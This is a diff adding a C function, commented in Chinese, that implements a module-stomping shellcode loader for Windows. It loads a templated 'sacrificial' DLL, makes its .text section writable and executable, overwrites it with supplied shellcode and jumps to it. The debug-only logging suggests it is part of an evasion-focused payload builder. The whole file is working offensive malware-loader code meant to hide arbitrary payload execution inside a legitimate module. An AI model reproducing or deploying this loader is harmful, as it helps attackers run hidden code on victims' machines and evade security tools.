@@ -1,0 +1,80 @@
+// 模块踩踏加载方式：利用合法DLL的.text节区执行Shellcode
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 模块踩踏方式执行Shellcode\n");
+    printf("[*] 牺牲DLL: %s\n", "{{ sacrificial_dll }}");
+#endif
+    
+    // 加载牺牲DLL
+    HMODULE hDll = LoadLibraryA("{{ sacrificial_dll }}");
+    if (!hDll) {
+#ifdef _DEBUG
+        printf("[!] 加载牺牲DLL失败: %d\n", GetLastError());
+#endif
+        return;
+    }
+    
+    // 获取DLL的NT头
+    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hDll;
+    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)hDll + dosHdr->e_lfanew);
+    
+    // 查找.text节区
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHdr);
+    PIMAGE_SECTION_HEADER textSection = NULL;
+    
+    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)section[i].Name, ".text") == 0) {
+            textSection = &section[i];
+            break;
+        }
+    }
+    
+    if (!textSection) {
+#ifdef _DEBUG
+        printf("[!] 未找到.text节区\n");
+#endif
+        FreeLibrary(hDll);
+        return;
+    }
+    
+    // 计算.text节区的虚拟地址
+    LPVOID textSectionAddr = (BYTE*)hDll + textSection->VirtualAddress;
+    SIZE_T textSectionSize = textSection->Misc.VirtualSize;
+    
+    // 检查Shellcode大小
+    if (shellcodeSize > textSectionSize) {
+#ifdef _DEBUG
+        printf("[!] Shellcode大小超过.text节区大小\n");
+#endif
+        FreeLibrary(hDll);
+        return;
+    }
+    
+    // 修改内存保护为可写
+    DWORD oldProtect;
+    if (!VirtualProtect(textSectionAddr, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+#ifdef _DEBUG
+        printf("[!] 修改内存保护失败: %d\n", GetLastError());
+#endif
+        FreeLibrary(hDll);
+        return;
+    }
+    
+    // 覆盖.text节区
+    memcpy(textSectionAddr, shellcode, shellcodeSize);
+    
+#ifdef _DEBUG
+    printf("[*] 成功覆盖.text节区，地址: %p, 大小: %d\n", textSectionAddr, shellcodeSize);
+#endif
+    
+    // 执行Shellcode（通过调用DLL导出函数触发）
+    // 这里简化处理，实际应该找到合适的导出函数调用
+    typedef void (*PFN_EXECUTE)(void);
+    PFN_EXECUTE pExecute = (PFN_EXECUTE)textSectionAddr;
+    pExecute();
+    
+    // 恢复内存保护
+    VirtualProtect(textSectionAddr, shellcodeSize, oldProtect, &oldProtect);
+    
+    FreeLibrary(hDll);
+}
